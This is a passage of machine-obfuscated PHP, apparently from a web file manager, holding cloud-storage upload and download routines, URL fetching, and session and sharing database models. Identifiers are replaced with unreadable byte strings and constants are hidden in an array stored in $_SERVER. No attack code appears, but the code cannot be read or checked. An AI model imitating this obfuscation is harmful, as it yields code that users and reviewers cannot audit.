IO::size($İó…›Ñ¶); if ($ı¶¨Ÿìê <= 1024 * 1024 * 200) { $â‰íÜ÷ï = array($’©×›·Æ[1596] . $İó…›Ñ¶); $Õä§Ãˆ = $this->ussRequest($ÓÓããÇ¹, $’©×›·Æ[256], $â‰íÜ÷ï); return $Õä§Ãˆ[$’©×›·Æ[1309]] ? $this->getPathOuter($ÓÓããÇ¹) : !1; } $ÕîˆıÉš = 1024 * 1024 * 10; $ÃîƒàË = array($’©×›·Æ[1597], $’©×›·Æ[1598] . $ı¶¨Ÿìê, $’©×›·Æ[1599], $’©×›·Æ[1600] . $ÕîˆıÉš); $Õä§Ãˆ = $this->ussRequest($ÓÓããÇ¹, $’©×›·Æ[256], !1, $ÃîƒàË); if (!$Õä§Ãˆ[$’©×›·Æ[1309]]) { return !1; } $›ôµ›„ó = $Õä§Ãˆ[$’©×›·Æ[1299]]; $¿ƒÜ“ = 0; $­›Ì ¯ = $›ôµ›„ó[$’©×›·Æ[1601]]; $¢‘œÜ®€ = fopen($İó…›Ñ¶, $’©×›·Æ[1478]); if (!$¢‘œÜ®€) { return !1; } do { $£Éåîıè = $›ôµ›„ó[$’©×›·Æ[1602]]; fseek_64($¢‘œÜ®€, $¿ƒÜ“); $²ÌÕî¼½ = fread($¢‘œÜ®€, $£Éåîıè); $Î™íûÖ¾ = 0; do { $Î™íûÖ¾++; $›ôµ›„ó = $this->uploadPart($ÓÓããÇ¹, $›ôµ›„ó, $²ÌÕî¼½); } while (!$›ôµ›„ó && $Î™íûÖ¾ < 3); if (!$›ôµ›„ó) { return !1; } $­›Ì ¯ = $›ôµ›„ó[$’©×›·Æ[1601]]; $¿ƒÜ“ += $£Éåîıè; } while ($­›Ì ¯ != -1); fclose($¢‘œÜ®€); $ÃîƒàË = array($’©×›·Æ[1603], $’©×›·Æ[1604] . $›ôµ›„ó[$’©×›·Æ[1605]], $’©×›·Æ[1599]); $Õä§Ãˆ = $this->ussRequest($ÓÓããÇ¹, $’©×›·Æ[256], !1, $ÃîƒàË); return $Õä§Ãˆ[$’©×›·Æ[1309]] ? $this->getPathOuter($÷ÉÜƒ¨ä) : !1; } private function uploadPart($ªçË„·â, $­õ›Åù, &$ëÓÄÁİ) { $şß“ıÛ× =& $_SERVER[¼¥ÊĞÙÌ]; $õ©ı«Îï = array($şß“ıÛ×[1606], $şß“ıÛ×[1604] . $­õ›Åù[$şß“ıÛ×[1605]], $şß“ıÛ×[1607] . $­õ›Åù[$şß“ıÛ×[1601]], $şß“ıÛ×[146] . $­õ›Åù[$şß“ıÛ×[1602]]); $‰»ˆÔ…Û = $this->ussRequest($ªçË„·â, $şß“ıÛ×[256], $ëÓÄÁİ, $õ©ı«Îï); return !$‰»ˆÔ…Û[$şß“ıÛ×[1309]] ? $‰»ˆÔ…Û[$şß“ıÛ×[1309]] : $‰»ˆÔ…Û[$şß“ıÛ×[1299]]; } public function uploadFormData($Â÷Ø¥, $†±ê¾Ïì = 3600) { return $this->uploadPolicy($Â÷Ø¥, $†±ê¾Ïì); } public function uploadMultiData($¢ËÁÉæù, $óÊ®¦æ¨ = 3600) { $÷“–ş… =& $_SERVER[¼¥ÊĞÙÌ]; $ñ£×êÃí = (int) $GLOBALS[$÷“–ş…[7]][$÷“–ş…[79]]; return $this->uploadPolicy($¢ËÁÉæù, $óÊ®¦æ¨, $ñ£×êÃí); } private function uploadPolicy($Öèûî É, $ÉìÅÊÛø = 3600, $Ïò¸“Ç‡ = 0) { $Ìª¹ßè¿ =& $_SERVER[¼¥ÊĞÙÌ]; $Ë Öä´ƒ = $Ìª¹ßè¿[8] . $this->bucket; $¨™ÂÚºà = gmdate($Ìª¹ßè¿[1513]); $€ß©ÇÕ› = array($Ìª¹ßè¿[1608] => $this->bucket, $Ìª¹ßè¿[1609] => $Öèûî É, $Ìª¹ßè¿[1610] => time() + $ÉìÅÊÛø, $Ìª¹ßè¿[1611] => $¨™ÂÚºà); if ($Ïò¸“Ç‡) { $€ß©ÇÕ›[$Ìª¹ßè¿[1498]] = $Ïò¸“Ç‡; } $—Õæ†½½ = base64_encode(json_encode($€ß©ÇÕ›)); $±öÛ¸øÚ = base64_encode(hash_hmac($Ìª¹ßè¿[1565], "\120\117\123\x54\x26{$Ë Öä´ƒ}\x26{$¨™ÂÚºà}\x26{$—Õæ†½½}", md5("{$this->userpass}"), !0)); $Ù¦©Ÿ¡È = array($Ìª¹ßè¿[280] => $—Õæ†½½, $Ìª¹ßè¿[1612] => "\x55\x50\131\x55\x4e\x20{$this->username}\x3a{$±öÛ¸øÚ}", $Ìª¹ßè¿[209] => $this->endpoint . $Ë Öä´ƒ); return $Ù¦©Ÿ¡È; } public function download($´ñ Õ•¤, $âØ¼åç£) { $©²¦Ì÷ = IO::getPathInner(IO::mkfile($âØ¼åç£)); if (!($•ÁÀÙ©º = $this->link($´ñ Õ•¤))) { return !1; } $®ëÊÆã = 0; $“¨¸²ë² = 1024 * 200; $‰‰™µ¨ = fopen($©²¦Ì÷, $_SERVER[¼¥ÊĞÙÌ][1560]); while (!0) { $²­“ìü¸ = $this->fileSubstr($´ñ Õ•¤, $®ëÊÆã, $“¨¸²ë²); if ($²­“ìü¸ === !1) { return !1; } fwrite($‰‰™µ¨, $²­“ìü¸); $®ëÊÆã += $“¨¸²ë²; if (strlen($²­“ìü¸) < $“¨¸²ë²) { break; } } fclose($‰‰™µ¨); return $âØ¼åç£; } public function link($š¶âä§–, $é•ôïÆ¼ = array()) { $Ø¹„»ÉŠ =& $_SERVER[¼¥ÊĞÙÌ]; $š¶âä§– = trim($š¶âä§–, $Ø¹„»ÉŠ[8]); if (!empty($this->token)) { $´„İÑŞ° = strtotime(date($Ø¹„»ÉŠ[1613])); $Ÿş‘‘¡‰ = substr(md5($this->token . $Ø¹„»ÉŠ[287] . $´„İÑŞ° . $Ø¹„»ÉŠ[1614] . $š¶âä§–), 12, 8) . $´„İÑŞ°; $é•ôïÆ¼[] = $Ø¹„»ÉŠ[1615] . $Ÿş‘‘¡‰; } $ÊÔŒûÁ = !empty($é•ôïÆ¼) ? $Ø¹„»ÉŠ[76] . implode($Ø¹„»ÉŠ[287], $é•ôïÆ¼) : $Ø¹„»ÉŠ[12]; return $this->getHost() . $Ø¹„»ÉŠ[8] . $this->pathEncode($š¶âä§–) . $ÊÔŒûÁ; } public function fileOut($éèª•·, $¡¦°¤ıÔ = false, $Éç£Ï¯Ä = false, $èØ½Û£ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($éèª•·, $¡¦°¤ıÔ, $Éç£Ï¯Ä, $èØ½Û£); } if (!$Éç£Ï¯Ä) { $Éç£Ï¯Ä = $this->pathThis($éèª•·); } $ Ñ˜Ñæ = $¡¦°¤ıÔ ? array($_SERVER[¼¥ÊĞÙÌ][1616] . rawurlencode($Éç£Ï¯Ä)) : array(); $–Í¬ÈæÎ = $this->link($éèª•·, $ Ñ˜Ñæ); $this->fileOutLink($–Í¬ÈæÎ); } public function fileOutServer($Ô‚æ¥¸ß, $ÜëÅ»ÉÒ = false, $«Ü¨‚İô = false, $ÄÔ­± = '') { parent::fileOut($Ô‚æ¥¸ß, $ÜëÅ»ÉÒ, $«Ü¨‚İô, $ÄÔ­±); } public function fileOutImage($Ø±°¿Ñ, $üŒ¼ë°› = 250) { $îöŸ = $this->link($Ø±°¿Ñ . $_SERVER[¼¥ÊĞÙÌ][1617] . $üŒ¼ë°›); $this->fileOutLink($îöŸ); } public function fileOutImageServer($îé·™äı, $ˆæÍäìõ = 250) { parent::fileOutImage($îé·™äı, $ˆæÍäìõ); } public function hashMd5($â…£å) { $°¥«»‹ü =& $_SERVER[¼¥ÊĞÙÌ]; $¹Æß®§¶ = $this->_objectMeta($â…£å); return isset($¹Æß®§¶[$°¥«»‹ü[248]]) ? $¹Æß®§¶[$°¥«»‹ü[248]] : !1; } public function size($ ªŞ†¿) { $Ëèˆö½À = $this->objectMeta($ ªŞ†¿); return $Ëèˆö½À ? $Ëèˆö½À[$_SERVER[¼¥ÊĞÙÌ][79]] : 0; } public function info($®ŒÁ‚’ß) { if ($this->isFolder($®ŒÁ‚’ß)) { return $this->folderInfo($®ŒÁ‚’ß); } else { if ($this->isFile($®ŒÁ‚’ß)) { return $this->fileInfo($®ŒÁ‚’ß); } } return !1; } public function exist($â†²âØ) { return $this->isFile($â†²âØ) || $this->isFolder($â†²âØ); } public function isFile($ËÚòÅ™) { return !$this->isFolder($ËÚòÅ™) && $this->objectMeta($ËÚòÅ™); } public function isFolder($Ìòî„»Ç) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][180], $Ìòî„»Ç); } protected function objectMeta($ëĞ¶±ÙË) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][182], $ëĞ¶±ÙË); } protected function _objectMeta($£¿ìÎ—Ø) { $ŒÀá’»Í =& $_SERVER[¼¥ÊĞÙÌ]; if ($£¿ìÎ—Ø == $ŒÀá’»Í[12] || $£¿ìÎ—Ø == $ŒÀá’»Í[8]) { return array(); } $·Ë­Î¡ = $this->ussRequest($£¿ìÎ—Ø, $ŒÀá’»Í[1618]); if (!$·Ë­Î¡[$ŒÀá’»Í[1309]]) { return null; } $ëæáØüÍ = isset($·Ë­Î¡[$ŒÀá’»Í[1299]]) ? $·Ë­Î¡[$ŒÀá’»Í[1299]] : array(); if (!isset($ëæáØüÍ[$ŒÀá’»Í[1619]])) { return null; } $±Ò¼«ğ = array($ŒÀá’»Í[33] => isset($ëæáØüÍ[$ŒÀá’»Í[1619]]) ? $ëæáØüÍ[$ŒÀá’»Í[1619]] : null, $ŒÀá’»Í[79] => isset($ëæáØüÍ[$ŒÀá’»Í[1620]]) ? $ëæáØüÍ[$ŒÀá’»Í[1620]] : null, $ŒÀá’»Í[248] => isset($ëæáØüÍ[$ŒÀá’»Í[1621]]) ? $ëæáØüÍ[$ŒÀá’»Í[1621]] : null, $ŒÀá’»Í[1588] => isset($ëæáØüÍ[$ŒÀá’»Í[1622]]) ? $ëæáØüÍ[$ŒÀá’»Í[1622]] : null); $±Ò¼«ğ[$ŒÀá’»Í[1589]] = isset($ëæáØüÍ[$ŒÀá’»Í[1623]]) ? strtotime($ëæáØüÍ[$ŒÀá’»Í[1623]]) : $±Ò¼«ğ[$ŒÀá’»Í[1588]]; return $±Ò¼«ğ; } protected function _isFolder($¤ÚÎí“Œ) { $®†¸³« =& $_SERVER[¼¥ÊĞÙÌ]; if ($¤ÚÎí“Œ == $®†¸³«[12] || $¤ÚÎí“Œ == $®†¸³«[8]) { return !0; } $‰•‡ç = $this->_objectMeta($¤ÚÎí“Œ); return isset($‰•‡ç[$®†¸³«[33]]) && $‰•‡ç[$®†¸³«[33]] == $®†¸³«[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¶§ÖõâÃ = false) { } public function exist($¹‚”üÑ) { $À†µ•‡ = $this->info($¹‚”üÑ); return $À†µ•‡[$_SERVER[¼¥ÊĞÙÌ][235]]; } public function isFile($˜À£ÓĞ) { $É¢…ïÙ = $this->info($˜À£ÓĞ); return $É¢…ïÙ[$_SERVER[¼¥ÊĞÙÌ][235]]; } public function isFolder($¼ÆáÅòÔ) { return !1; } public function size($Ê«ÉÌİ) { $¡ùçóâı = $this->info($Ê«ÉÌİ); return $¡ùçóâı[$_SERVER[¼¥ÊĞÙÌ][79]]; } public function info($’êŸ™›Œ) { return $this->infoParse($’êŸ™›Œ); } public function infoAuth($ÌêĞÔ§û) { return $this->infoParse($ÌêĞÔ§û); } public function infoWithChildren($†¦Šİø©) { return $this->infoParse($†¦Šİø©); } public function infoFull($Ş½ÊèÇ) { return $this->infoParse($Ş½ÊèÇ); } private function infoParse($èşÉòşº) { $ù°¥£Ú =& $_SERVER[¼¥ÊĞÙÌ]; $¸ÂÖ‘”û = $this->header($èşÉòşº); if (!$¸ÂÖ‘”û || !$¸ÂÖ‘”û[$ù°¥£Ú[824]]) { return !1; } $Ë¹é¿‹ = _get($¸ÂÖ‘”û, $ù°¥£Ú[415], 0); $›ÙÔ›»ï = array($ù°¥£Ú[32] => $¸ÂÖ‘”û[$ù°¥£Ú[32]], $ù°¥£Ú[87] => $èşÉòşº, $ù°¥£Ú[33] => $ù°¥£Ú[233], $ù°¥£Ú[79] => intval($Ë¹é¿‹), $ù°¥£Ú[169] => get_path_ext($¸ÂÖ‘”û[$ù°¥£Ú[32]]), $ù°¥£Ú[1475] => $Ë¹é¿‹ > 0 && $¸ÂÖ‘”û[$ù°¥£Ú[1624]], $ù°¥£Ú[1476] => !1); return $›ÙÔ›»ï; } private function header($µ²¸Öûù) { $ˆùèã…† =& $_SERVER[¼¥ÊĞÙÌ]; if (isset(self::$_cacheHeader[$µ²¸Öûù])) { return self::$_cacheHeader[$µ²¸Öûù]; } $±¬Ş¯ÓË = isset($GLOBALS[$ˆùèã…†[1625]]) ? $GLOBALS[$ˆùèã…†[1625]] : !1; $GLOBALS[$ˆùèã…†[1625]] = !0; self::$_cacheHeader[$µ²¸Öûù] = url_header($µ²¸Öûù); $GLOBALS[$ˆùèã…†[1625]] = $±¬Ş¯ÓË; return self::$_cacheHeader[$µ²¸Öûù]; } public function hashSimple($Œæ¾ˆ½¢, $Ò«½½ãö = false) { $ºÑïñæ© =& $_SERVER[¼¥ÊĞÙÌ]; $ä³œäÓ‹ = $this->info($Œæ¾ˆ½¢); if (!$ä³œäÓ‹ || !$ä³œäÓ‹[$ºÑïñæ©[235]]) { return !1; } $ß©İ–ó‡ = $ä³œäÓ‹[$ºÑïñæ©[79]]; $¬·µ¾‰Œ = 200; $Í¹³å³£ = 50; if ($ß©İ–ó‡ <= $¬·µ¾‰Œ * $Í¹³å³£) { return md5($this->fileSubstr($Œæ¾ˆ½¢, 0, $ß©İ–ó‡)) . $ß©İ–ó‡; } $š„—…Ìî = intval($ß©İ–ó‡ / $Í¹³å³£); $‹Ó™©®† = $ºÑïñæ©[12]; $«Çß¡«Ò = timeFloat(); $İÇÇ’ = 15; for ($ö®ğÕ„  = 0; $ö®ğÕ„  < $Í¹³å³£; $ö®ğÕ„ ++) { if (timeFloat() - $«Çß¡«Ò > $İÇÇ’) { return !1; } $ÎÓÔ² = $this->fileSubstr($Œæ¾ˆ½¢, $š„—…Ìî * $ö®ğÕ„ , $¬·µ¾‰Œ); if (!$ÎÓÔ²) { return !1; } $‹Ó™©®† .= $ÎÓÔ²; } $‹Ó™©®† .= $this->fileSubstr($Œæ¾ˆ½¢, $ß©İ–ó‡ - $¬·µ¾‰Œ, $¬·µ¾‰Œ); return md5($‹Ó™©®†) . $ß©İ–ó‡; } public function getContent($À­œ·„œ) { return $this->fileSubstr($À­œ·„œ); } public function fileSubstr($—ãºú¡«, $ª‰É³»à = 0, $“±ùÀ¹ø = -1) { $½¯ïÆŸ =& $_SERVER[¼¥ÊĞÙÌ]; $Î‚ÈÙÚæ = $this->info($—ãºú¡«); if (!$Î‚ÈÙÚæ || !$Î‚ÈÙÚæ[$½¯ïÆŸ[235]] && $Î‚ÈÙÚæ[$½¯ïÆŸ[79]] > 1024 * 1024 * 10) { return !1; } if ($“±ùÀ¹ø === -1) { $“±ùÀ¹ø = $Î‚ÈÙÚæ[$½¯ïÆŸ[79]]; } if ($“±ùÀ¹ø == 0) { return $½¯ïÆŸ[12]; } $‘ğ¥‚ì = array($½¯ïÆŸ[1626] . $ª‰É³»à . $½¯ïÆŸ[861] . ($ª‰É³»à + $“±ùÀ¹ø - 1)); $Äœ…¶ùâ = url_request($—ãºú¡«, $½¯ïÆŸ[1515], !1, $‘ğ¥‚ì, !1, !1, 30); return $Äœ…¶ùâ[$½¯ïÆŸ[1299]] ? $Äœ…¶ùâ[$½¯ïÆŸ[1299]] : $½¯ïÆŸ[12]; } public function download($Œ˜ÇŸü, $å©†Æ¤¼) { Downloader::start($Œ˜ÇŸü, $å©†Æ¤¼); return $å©†Æ¤¼; } } goto dêÆĞ¦Ô¯; DíÛ¬»»„ë: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\155\x5f\x73\x65\163\x73\x69\157\156"; public function get($ˆúƒÙÓä) { $•¾Ä÷¢· =& $_SERVER[¼¥ÊĞÙÌ]; $‡İÃ¸÷ = $this->where(array($•¾Ä÷¢·[2130] => $ˆúƒÙÓä))->find(); if (!is_array($‡İÃ¸÷)) { return !1; } return $‡İÃ¸÷[$•¾Ä÷¢·[171]]; } public function set($Éœ„‚üª, $èğ™†º, $¯í–§Ÿ“ = 3600) { $»½§‚÷ü =& $_SERVER[¼¥ÊĞÙÌ]; $Œç«ø… = array($»½§‚÷ü[2130] => $Éœ„‚üª, $»½§‚÷ü[2030] => $èğ™†º, $»½§‚÷ü[2131] => $¯í–§Ÿ“ + time()); if (Session::get($»½§‚÷ü[2132])) { $Œç«ø…[$»½§‚÷ü[1790]] = Session::get($»½§‚÷ü[2132]); } else { $Œç«ø…[$»½§‚÷ü[1790]] = 0; } if ($this->get($Éœ„‚üª)) { return $this->where(array($»½§‚÷ü[2130] => $Éœ„‚üª))->save($Œç«ø…); } else { return $this->add($Œç«ø…, array(), !0); } } public function remove($áûåÃ¾Ù) { return $this->where(array($_SERVER[¼¥ÊĞÙÌ][2130] => $áûåÃ¾Ù))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¼¥ÊĞÙÌ][2133] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\x69\x6d\145", "\164\151\155\x65", "\151\156\x73\145\x72\x74\x2c\165\160\x64\x61\164\x65", "\x66\x75\156\143\164\x69\157\x6e"), array("\x63\162\145\x61\x74\145\124\151\x6d\145", "\164\x69\x6d\145", "\151\156\x73\145\x72\x74", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x6f\x70\x74\x69\157\x6e\163", '', "\x69\156\163\145\x72\x74\54\165\x70\x64\141\x74\145\54\163\x65\x6c\x65\x63\x74", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ÏÒ½¯ÜÒ) { $¸Åë×ê‘ =& $_SERVER[¼¥ÊĞÙÌ]; $ŸÂšïë = isset($ÏÒ½¯ÜÒ[0]) ? $ÏÒ½¯ÜÒ[0] : !1; $´µ³«÷ï = $¸Åë×ê‘[2134] . USER_ID; return array($¸Åë×ê‘[2135] => array(USER_ID, $¸Åë×ê‘[2136]), $¸Åë×ê‘[2075] => array($ŸÂšïë, $¸Åë×ê‘[2137], $´µ³«÷ï)); } protected function listSimple() { $ŠÖÖâ = array($_SERVER[¼¥ÊĞÙÌ][1790] => USER_ID); $ƒ¢ÜïŠš = $this->field($this->fieldList)->where($ŠÖÖâ)->select(); return $ƒ¢ÜïŠš ? $ƒ¢ÜïŠš : array(); } protected function getInfo($ô‡²å¸“, $ÁüÛß†ì = false, $âŞîáÎ© = '') { $ºË“ıÆ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$âŞîáÎ©) { $âŞîáÎ© = $ºË“ıÆ[2134] . USER_ID; } if ($ÁüÛß†ì) { return $this->_getShareInfo(array($ºË“ıÆ[673] => $ô‡²å¸“)); } $¥Ÿà€†î = $this->cacheFunctionGet($ºË“ıÆ[2077], $ô‡²å¸“, $âŞîáÎ©); $ÎŸÅÎé½ = $this->shareInfoMofify($¥Ÿà€†î, $ºË“ıÆ[226]); if (isset($¥Ÿà€†î[$ºË“ıÆ[88]]) && $ÎŸÅÎé½ != $¥Ÿà€†î[$ºË“ıÆ[88]]) { $í¢ÃÃáí = $this->cacheKeyMake($ºË“ıÆ[2077], $ô‡²å¸“, $âŞîáÎ©); $¥Ÿà€†î = $this->_getShareInfo(array($ºË“ıÆ[673] => $ô‡²å¸“)); Cache::set($í¢ÃÃáí, $¥Ÿà€†î); } return $¥Ÿà€†î; } private function shareInfoMofify(&$ÒõÔşë¾, $İŠàÅÉ¢ = "\147\145\x74") { $Ñ…Å…š =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ÒõÔşë¾ || !isset($ÒõÔşë¾[$Ñ…Å…š[673]])) { return; } $Êà£Ø…¯ = $Ñ…Å…š[2138] . $ÒõÔşë¾[$Ñ…Å…š[673]]; if ($İŠàÅÉ¢ == $Ñ…Å…š[226]) { return Cache::get($Êà£Ø…¯); } else { if ($İŠàÅÉ¢ == $Ñ…Å…š[2106]) { $óÂ‰áÅ = Cache::get($Êà£Ø…¯); if ($óÂ‰áÅ === $ÒõÔşë¾[$Ñ…Å…š[88]]) { return; } $ÒõÔşë¾[$Ñ…Å…š[2139]] = USER_ID . $Ñ…Å…š[465] . $ÒõÔşë¾[$Ñ…Å…š[88]]; Cache::set($Êà£Ø…¯, $ÒõÔşë¾[$Ñ…Å…š[88]]); } else { if ($İŠàÅÉ¢ == $Ñ…Å…š[2140]) { Cache::remove($Êà£Ø…¯); } } } } public function getInfoByHash($í°à½˜) { return $this->_getShareInfo(array($_SERVER[¼¥ÊĞÙÌ][2141] => $í°à½˜)); } public function getInfoByPath($úÛæÛõü) { $¬ù¨½ =& $_SERVER[¼¥ÊĞÙÌ]; $¼Œ€ Úã = array($¬ù¨½[1790] => USER_ID, $¬ù¨½[194] => $úÛæÛõü); return $this->_getShareInfo($¼Œ€ Úã); } public function getInfoBySourcePath($íÊ®¡™ü) { $ÊÖ×–·â =& $_SERVER[¼¥ÊĞÙÌ]; $²ªÜ½± = array($ÊÖ×–·â[1790] => USER_ID, $ÊÖ×–·â[1269] => $íÊ®¡™ü); return $this->_getShareInfo($²ªÜ½±); } private function _getShareInfo($°¦áçåà) { $ÎØ×¾– =& $_SERVER[¼¥ÊĞÙÌ]; $ÃÎºİÊ­ = $this->where($°¦áçåà)->find(); if (!$ÃÎºİÊ­) { return !1; } $°¦áçåà = array($ÎØ×¾–[673] => $ÃÎºİÊ­[$ÎØ×¾–[673]]); $…äëøö = $ÎØ×¾–[2142]; $µöåÃªØ = Model($ÎØ×¾–[674])->order($ÎØ×¾–[478])->field($…äëøö)->where($°¦áçåà)->select(); if ($ÃÎºİÊ­[$ÎØ×¾–[194]] == $ÎØ×¾–[231]) { $ÃÎºİÊ­[$ÎØ×¾–[90]] = IO::info($ÃÎºİÊ­[$ÎØ×¾–[1269]]); } else { $ÃÎºİÊ­[$ÎØ×¾–[90]] = Model($ÎØ×¾–[1440])->pathInfo($ÃÎºİÊ­[$ÎØ×¾–[194]]); } $ÃÎºİÊ­[$ÎØ×¾–[2143]] = $µöåÃªØ; $this->shareInfoMofify($ÃÎºİÊ­, $ÎØ×¾–[2106]); return $ÃÎºİÊ­; } protected function getInfoAuth($¼ÚÌåÚ€) { $æø¨ù¨ã =& $_SERVER[¼¥ÊĞÙÌ]; $’µ‚ãŞŠ = $this->getInfo($¼ÚÌåÚ€); if ($’µ‚ãŞŠ[$æø¨ù¨ã[1790]] == USER_ID) { $’µ‚ãŞŠ[$æø¨ù¨ã[490]] = $’µ‚ãŞŠ[$æø¨ù¨ã[90]][$æø¨ù¨ã[490]]; } else { $’µ‚ãŞŠ[$æø¨ù¨ã[490]] = Model($æø¨ù¨ã[572])->authMake($’µ‚ãŞŠ[$æø¨ù¨ã[2143]]); } return $’µ‚ãŞŠ; } protected function listData($“÷¡ÙèÆ = null, $äôªµã = 300) { $Œ„èµúê =& $_SERVER[¼¥ÊĞÙÌ]; $ÓÊÁøô = array(array($Œ„èµúê[567] => array($Œ„èµúê[1098], 0), $Œ„èµúê[671] => array($Œ„èµúê[1098], 0), $Œ„èµúê[2144] => $Œ„èµúê[2094])); if ($“÷¡ÙèÆ == $Œ„èµúê[2145]) { $ÓÊÁøô = array($Œ„èµúê[567] => 1); } else { if ($“÷¡ÙèÆ == $Œ„èµúê[1252]) { $ÓÊÁøô = array($Œ„èµúê[671] => 1); } } $ÓÊÁøô[$Œ„èµúê[1790]] = USER_ID; $ä³›ü¦£ = $this->where($ÓÊÁøô)->selectPage($äôªµã); return $ä³›ü¦£; } protected function listToMe($å„º›á‡ = 300) { $¼¶Ôà˜´ =& $_SERVER[¼¥ÊĞÙÌ]; $ßÂé°ù« = Model($¼¶Ôà˜´[2146])->userGroupParents(USER_ID); $ƒ‡‰î‘Î = array($¼¶Ôà˜´[656] => SourceModel::TYPE_USER, $¼¶Ôà˜´[574] => USER_ID); if ($ßÂé°ù«) { $ƒ‡‰î‘Î = array(array($¼¶Ôà˜´[656] => SourceModel::TYPE_USER, $¼¶Ôà˜´[574] => USER_ID), array($¼¶Ôà˜´[656] => SourceModel::TYPE_GROUP, $¼¶Ôà˜´[574] => array($¼¶Ôà˜´[7], $ßÂé°ù«)), $¼¶Ôà˜´[2144] => $¼¶Ôà˜´[2094]); } $§¦Æ¦Ò• = Model($¼¶Ôà˜´[674])->where($ƒ‡‰î‘Î)->selectPage($å„º›á‡); $£Ù˜ÔØ® = array_to_keyvalue_group($§¦Æ¦Ò•[$¼¶Ôà˜´[448]], $¼¶Ôà˜´[673]); if (!$£Ù˜ÔØ®) { return $§¦Æ¦Ò•; } $ÅğÛÚÈ = $¼¶Ôà˜´[2147]; $ƒ‡‰î‘Î = array($¼¶Ôà˜´[673] => array($¼¶Ôà˜´[495], array_keys($£Ù˜ÔØ®)), $¼¶Ôà˜´[1790] => array($¼¶Ôà˜´[1100], $¼¶Ôà˜´[231])); $„ğ²Ë¬¥ = $this->field($ÅğÛÚÈ)->where($ƒ‡‰î‘Î)->select(); foreach ($„ğ²Ë¬¥ as $¥íô´ì” => &$ö¿ÚÕ’³) { $ö¿ÚÕ’³[$¼¶Ôà˜´[2143]] = $£Ù˜ÔØ®[$ö¿ÚÕ’³[$¼¶Ôà˜´[673]]]; } unset($ö¿ÚÕ’³); $„äåÆƒ = array($¼¶Ôà˜´[2148] => $„ğ²Ë¬¥, $¼¶Ôà˜´[2149] => $§¦Æ¦Ò•[$¼¶Ôà˜´[445]]); return $„äåÆƒ; } protected function shareAdd($»®µ¾æğ, $ò¿¬Å¢) { $÷Ş®º =& $_SERVER[¼¥ÊĞÙÌ]; $ç™Îç‚Ó = $this->_addShareData($»®µ¾æğ, $ò¿¬Å¢); if (!empty($ò¿¬Å¢[$÷Ş®º[2150]])) { $this->_shareAuthSet($ç™Îç‚Ó, $ò¿¬Å¢[$÷Ş®º[2150]]); } $this->shareEventAdd($»®µ¾æğ, $ò¿¬Å¢, $÷Ş®º[2151]); return $ç™Îç‚Ó; } protected function shareAddSystem($Ğ³‚ÖÏ×, $ìó‘ÚÔ) { $çÛ ØÀû =& $_SERVER[¼¥ÊĞÙÌ]; $öŒÔ¨À‚ = $this->_addShareData($Ğ³‚ÖÏ×, $ìó‘ÚÔ, $çÛ ØÀû[192]); $this->_shareAuthSet($öŒÔ¨À‚, $ìó‘ÚÔ[$çÛ ØÀû[2150]]); return $öŒÔ¨À‚; } private function shareEventAdd($Ğî„¤Áê, $‘³ÛÀ, $•…È…İ„ = "\x61\144\x64") { $££İ„ß =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Ğî„¤Áê || $Ğî„¤Áê == $££İ„ß[231]) { return; } if ($•…È…İ„ == $££İ„ß[2151]) { if ($‘³ÛÀ[$££İ„ß[567]] == $££İ„ß[91]) { Model($££İ„ß[641])->eventShare($Ğî„¤Áê, $££İ„ß[2152]); } if ($‘³ÛÀ[$££İ„ß[671]] == $££İ„ß[91]) { Model($££İ„ß[641])->eventShare($Ğî„¤Áê, $££İ„ß[2153]); } return; } $İÖÊíŠ• = $this->getInfoByPath($Ğî„¤Áê); $ÅÙº¼ë = $££İ„ß[2154]; if ($İÖÊíŠ•[$££İ„ß[567]] == $££İ„ß[231] && $‘³ÛÀ[$££İ„ß[567]] == $££İ„ß[91]) { $ÅÙº¼ë = $££İ„ß[2152]; } if ($İÖÊíŠ•[$££İ„ß[567]] == $££İ„ß[91] && $‘³ÛÀ[$££İ„ß[567]] == $££İ„ß[231]) { $ÅÙº¼ë = $££İ„ß[2155]; } if ($İÖÊíŠ•[$££İ„ß[671]] == $££İ„ß[231] && $‘³ÛÀ[$££İ„ß[671]] == $££İ„ß[91]) { $ÅÙº¼ë = $££İ„ß[2153]; } if ($İÖÊíŠ•[$££İ„ß[671]] == $££İ„ß[91] && $‘³ÛÀ[$££İ„ß[671]] == $££İ„ß[231]) { $ÅÙº¼ë = $££İ„ß[2156]; } Model($££İ„ß[641])->eventShare($Ğî„¤Áê, $ÅÙº¼ë); return; } private function _addShareData($ğöû‰Ší, $¿šÉ¥®Å = array(), $ ğ–¥ÊŸ = false) { $ÌæçÜÙ­ =& $_SERVER[¼¥ÊĞÙÌ]; $·Ö¾¡Û‘ = $ ğ–¥ÊŸ == $ÌæçÜÙ­[192] ? 0 : USER_ID; $§æóâ–¡ = array($ÌæçÜÙ­[494] => $ğöû‰Ší, $ÌæçÜÙ­[1781] => $·Ö¾¡Û‘); if ($ğöû‰Ší == 0) { $§æóâ–¡ = array($ÌæçÜÙ­[2157] => $¿šÉ¥®Å[$ÌæçÜÙ­[1269]], $ÌæçÜÙ­[1781] => $·Ö¾¡Û‘); } if ($ûü¥úÛœ = $this->where($§æóâ–¡)->find()) { return $ûü¥úÛœ[$ÌæçÜÙ­[673]]; } if ($ğöû‰Ší == 0) { $ßÒö§§ = array($ÌæçÜÙ­[32] => get_path_this($¿šÉ¥®Å[$ÌæçÜÙ­[87]])); } else { $ßÒö§§ = Model($ÌæçÜÙ­[904])->sourceInfo($ğöû‰Ší); if (!$ßÒö§§) { return !1; } } if (!$¿šÉ¥®Å[$ÌæçÜÙ­[1678]]) { $¿šÉ¥®Å[$ÌæçÜÙ­[1678]] = $ßÒö§§[$ÌæçÜÙ­[32]]; } $Êí²İ› = array($ÌæçÜÙ­[1781] => $·Ö¾¡Û‘, 